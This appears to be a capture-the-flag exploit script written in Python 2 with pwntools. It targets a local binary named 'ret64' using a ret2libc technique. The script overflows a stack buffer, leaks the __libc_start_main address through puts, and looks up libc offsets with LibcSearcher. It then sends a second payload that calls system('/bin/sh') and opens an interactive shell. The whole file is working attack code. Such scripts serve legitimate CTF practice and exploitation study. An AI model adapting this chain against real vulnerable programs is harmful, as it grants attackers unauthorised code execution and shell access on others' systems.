#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
sh = process('./ret64')

ret2libc3 = ELF('./ret64')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# gdb.attach(sh)
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
rdi_addr = 0x00000000004008a3
print hex(puts_plt), hex(libc_start_main_got), hex(main)
print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, 'b'*8,rdi_addr,libc_start_main_got, puts_plt, main])
# payload = flat(['A' * 112, 'b'*8,puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)
pause()
print "get the related addr"
libc_start_main_addr = u64(sh.recv()[0:6].ljust(8,'\x00'))
print("main addr ",hex(libc_start_main_addr))
main_off = libc.symbols['__libc_start_main']
# libc_base = libc_start_main_addr - main_off
# system_addr = libc_base + libc.symbols['system']
# bin_addr = 0x000000000018ce57
# # binsh_addr = libc_base + libc.symbols['str_bin_sh']
# binsh_addr = libc_base + bin_addr

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 112, 'b'*8,rdi_addr, binsh_addr,system_addr])
sh.sendline(payload)

sh.interactive()
